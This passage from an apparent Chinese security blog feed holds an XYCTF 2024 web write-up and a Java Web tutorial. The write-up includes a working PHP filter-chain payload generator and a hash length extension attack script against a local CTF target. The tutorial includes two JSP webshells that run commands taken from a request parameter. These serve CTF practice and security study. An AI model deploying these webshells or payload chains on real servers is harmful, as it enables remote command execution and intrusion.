class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;r&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;S&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;T&#x27;</span>: <span class="string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;X&#x27;</span>: <span class="string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Z&#x27;</span>: <span class="string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;+&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_filter_chain</span>(<span class="params">chain, debug_base64 = <span class="literal">False</span></span>):</span><br><span class="line"></span><br><span class="line">    encoded_chain = chain</span><br><span class="line">    <span class="comment"># generate some garbage base64</span></span><br><span class="line">    filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">    filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">    <span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">    filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> encoded_chain[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> debug_base64:</span><br><span class="line">        <span class="comment"># don&#x27;t add the decode while debugging chains</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">    final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line">    <span class="keyword">return</span> final_payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Parsing command line arguments</span></span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;PHP filter chain generator.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    parser.add_argument(<span class="string">&quot;--chain&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Content you want to generate. (you will maybe need to pad with spaces for your payload to work)&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;--rawbase64&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;The base64 value you want to test, the chain will be printed as base64 by PHP, useful to debug.&quot;</span>, required=<span class="literal">False</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.chain <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        chain = args.chain.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        base64_value = base64.b64encode(chain).decode(<span class="string">&#x27;utf-8&#x27;</span>).replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        chain = generate_filter_chain(base64_value)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] The following gadget chain will generate the following code : &#123;&#125; (base64 value: &#123;&#125;)&quot;</span>.<span class="built_in">format</span>(args.chain, base64_value))</span><br><span class="line">        <span class="built_in">print</span>(chain)</span><br><span class="line">    <span class="keyword">if</span> args.rawbase64 <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        rawbase64 = args.rawbase64.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">        <span class="keyword">match</span> = re.search(<span class="string">&quot;^([A-Za-z0-9+/])*$&quot;</span>, rawbase64)</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">match</span>):</span><br><span class="line">            chain = generate_filter_chain(rawbase64, <span class="literal">True</span>)</span><br><span class="line">            <span class="built_in">print</span>(chain)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;[-] Base64 string required.&quot;</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>把XYCTF多base64encode几次,然后用脚本生成payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 php_filter_chain_generator.py --chain Vm1wQ1lXTXhTa2RYYTFwWVZWRQ</span><br></pre></td></tr></table></figure><p>得到的payload多加五个base64-decode即可</p><h2 id="ezLFI"><a href="#ezLFI" class="headerlink" title="ezLFI"></a>ezLFI</h2><p>这题可以用php_filter_chain直接解掉了, 但是考点看起来应该是nginx fast-cgi响应过大产生临时文件的那个trick</p><p><a href="https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi">https://tttang.com/archive/1384/#toc_0x02-includers-revenge-nginx-fastcgi-temp-lfi</a></p><p>后面补一下吧</p><h2 id="give-me-flag-赛后"><a href="#give-me-flag-赛后" class="headerlink" title="give me flag(赛后)"></a>give me flag(赛后)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line">cc584e52a25c194614d8f8dff57c7f72</span><br></pre></td></tr></table></figure><p>一眼哈希扩展攻击, hashpump没了, 装了hexpand,一直报段错误….遂放弃</p><p>推荐另一个项目</p><p><a href="https://github.com/shellfeel/hash-ext-attack">https://github.com/shellfeel/hash-ext-attack</a></p><p>可以在下面一个连接直接查看当前unix时间戳</p><p><a href="https://tool.chinaz.com/tools/unixtime.aspx">https://tool.chinaz.com/tools/unixtime.aspx</a></p><p>稍微预测一个提前量:</p><p>1714286382</p><p>1714286700</p><p>扩展md5</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144622394.png" alt="image-20240428144622394"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://127.0.0.1:55475/&#x27;</span></span><br><span class="line">payload = <span class="string">&#x27;?md5=e84fbfa78340af6d44eedfd75c59445d&amp;value=%80%00%00%00%00%00%00%00%00%00%00%00%00X%01%00%00%00%00%00%00&#x27;</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    res=requests.get(url=url+payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;wait..&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;XYCTF&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="built_in">print</span>(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428144636517.png" alt="image-20240428144636517"></p><h2 id="baby-unserialize-未解出"><a href="#baby-unserialize-未解出" class="headerlink" title="baby_unserialize(未解出)"></a>baby_unserialize(未解出)</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;XYCTF-2024-Web&quot;&gt;&lt;a href=&quot;#XYCTF-2024-Web&quot; class=&quot;headerlink&quot; title=&quot;XYCTF 2024 Web&quot;&gt;&lt;/a&gt;XYCTF 2024 Web&lt;/h1&gt;&lt;h2 id=&quot;warm-up&quot;&gt;&lt;a href=</summary>
      
    
    
    
    
    <category term="ssti" scheme="http://example.com/tags/ssti/"/>
    
    <category term="命令注入" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5/"/>
    
    <category term="phar反序列化" scheme="http://example.com/tags/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="LFI" scheme="http://example.com/tags/LFI/"/>
    
  </entry>
  
  <entry>
    <title>Java Web基础</title>
    <link href="http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/04/07/Java-Web%E5%9F%BA%E7%A1%80/</id>
    <published>2024-04-07T14:42:56.000Z</published>
    <updated>2024-04-29T15:56:37.716Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-Web"><a href="#Java-Web" class="headerlink" title="Java Web"></a>Java Web</h1><h2 id="Tomcat＋Servlet"><a href="#Tomcat＋Servlet" class="headerlink" title="Tomcat＋Servlet"></a>Tomcat＋Servlet</h2><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>不同java版本对应的tomcat和servlet不太一样, 这里搭配如下:</p><p>java 1.8</p><p>Servlet 3.1.0</p><p>Tomcat 8</p><h3 id="pom-xml"><a href="#pom-xml" class="headerlink" title="pom.xml"></a>pom.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>Tomcat-Servlet_Demo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- https://mvnrepository.com/artifact/javax.servlet/javax.servlet-api --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>hello<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p>手动创建war包目录</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240428235641031.png" alt="image-20240428235641031"></p><h3 id="web-xml"><a href="#web-xml" class="headerlink" title="web.xml"></a>web.xml</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">web-app</span> <span class="keyword">PUBLIC</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;-//Sun Microsystems, Inc.//DTD Web Application 2.3//EN&quot;</span></span></span><br><span class="line"><span class="meta">        <span class="string">&quot;http://java.sun.com/dtd/web-app_2_3.dtd&quot;</span> &gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="其他细节参考"><a href="#其他细节参考" class="headerlink" title="其他细节参考"></a>其他细节参考</h3><p><a href="https://www.jianshu.com/p/b4b42a90b2e9">https://www.jianshu.com/p/b4b42a90b2e9</a></p><p><a href="https://blog.csdn.net/qq_52057693/article/details/124260380">https://blog.csdn.net/qq_52057693/article/details/124260380</a></p><h3 id="编写代码"><a href="#编写代码" class="headerlink" title="编写代码"></a>编写代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/hello&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        resp.setContentType(<span class="string">&quot;text/html;charset=utf-8&quot;</span>);</span><br><span class="line">        resp.getWriter().write(<span class="string">&quot;hello 你好&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后访问</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429000025817.png" alt="image-20240429000025817"></p><h2 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a>JSP</h2><blockquote><p>JSP（Java Server Pages），是Java的一种动态网页技术。在早期Java的开发技术中，Java程序员如果想要向浏览器输出一些数据，就必须得手动<code>println</code>一行行的HTML代码。为了解决这一繁琐的问题，Java开发了JSP技术。</p><p>JSP可以看作一个Java Servlet，主要用于实现Java web应用程序的用户界面部分。网页开发者们通过结合HTML代码、XHTML代码、XML元素以及嵌入JSP操作和命令来编写JSP。</p><p>当第一次访问JSP页面时，Tomcat服务器会将JSP页面翻译成一个java文件，并将其编译为.class文件。JSP通过网页表单获取用户输入数据、访问数据库及其他数据源，然后动态地创建网页。</p></blockquote><p>直接在webapp文件夹下创建jsp文件即可</p><p>脚本程序的语法格式：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% 代码片段 %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:scriptlet&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:scriptlet&gt;</span><br></pre></td></tr></table></figure><p>任何文本、HTML标签、JSP元素必须写在脚本程序的外面。</p><h3 id="JSP声明"><a href="#JSP声明" class="headerlink" title="JSP声明"></a>JSP声明</h3><p>一个声明语句可以声明一个或多个变量、方法，供后面的Java代码使用。在JSP文件中，您必须先声明这些变量和方法然后才能使用它们。</p><p>JSP声明的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! declaration; [ declaration; ]+ ... %&gt;</span><br></pre></td></tr></table></figure><p>或者，您也可以编写与其等价的XML语句，就像下面这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:declaration&gt;</span><br><span class="line">   代码片段</span><br><span class="line">&lt;/jsp:declaration&gt;</span><br></pre></td></tr></table></figure><p>程序示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! int i = 0; %&gt; </span><br><span class="line">&lt;%! int a, b, c; %&gt; </span><br><span class="line">&lt;%! Circle a = new Circle(2.0); %&gt; </span><br></pre></td></tr></table></figure><hr><h3 id="JSP表达式"><a href="#JSP表达式" class="headerlink" title="JSP表达式"></a>JSP表达式</h3><p>一个JSP表达式中包含的脚本语言表达式，先被转化成String，然后插入到表达式出现的地方。</p><p>由于表达式的值会被转化成String，所以您可以在一个文本行中使用表达式而不用去管它是否是HTML标签。</p><p>表达式元素中可以包含任何符合Java语言规范的表达式，但是不能使用分号来结束表达式。</p><p>JSP表达式的语法格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= 表达式 %&gt;</span><br></pre></td></tr></table></figure><p>同样，您也可以编写与之等价的XML语句：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;jsp:expression&gt;</span><br><span class="line">   表达式</span><br><span class="line">&lt;/jsp:expression&gt;</span><br></pre></td></tr></table></figure><h2 id="Java木马"><a href="#Java木马" class="headerlink" title="Java木马"></a>Java木马</h2><h3 id="JSP木马"><a href="#JSP木马" class="headerlink" title="JSP木马"></a>JSP木马</h3><p>传统无回显木马</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)); %&gt;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240429191039735.png" alt="image-20240429191039735"></p><p>有回显木马:</p><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;% <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;cmd&quot;</span>)!=<span class="literal">null</span>)&#123;</span><br><span class="line">    java.io.<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>)).getInputStream();</span><br><span class="line"> </span><br><span class="line">    <span class="type">BufferedReader</span> <span class="variable">bufferedReader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(in));</span><br><span class="line">    String line;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">printWriter</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ((line = bufferedReader.readLine()) != <span class="literal">null</span>)&#123;</span><br><span class="line">        printWriter.println(line);</span><br><span class="line">    &#125;</span><br><span class="line">    printWriter.write(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>如上的木马特征强,容易识别, 且需要文件落地, 由此,引出隐蔽性强,无需文件的内存马</p><h3 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h3><p>后面需要调试Tomcat, 重新弄个环境,参考:</p><p><a href="https://zhuanlan.zhihu.com/p/35454131">https://zhuanlan.zhihu.com/p/35454131</a></p><p>在此之前, 需要先了解Tomcat架构</p><p>膜拜大佬博客</p><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><h4 id="Tomcat三大组件"><a href="#Tomcat三大组件" class="headerlink" title="Tomcat三大组件"></a>Tomcat三大组件</h4><p><a href="https://goodapple.top/archives/1359">https://goodapple.top/archives/1359</a></p><p>三大组件的加载顺序为<code>**Listener-&gt;Filter-&gt;Servlet**</code>。</p><h4 id="Context"><a 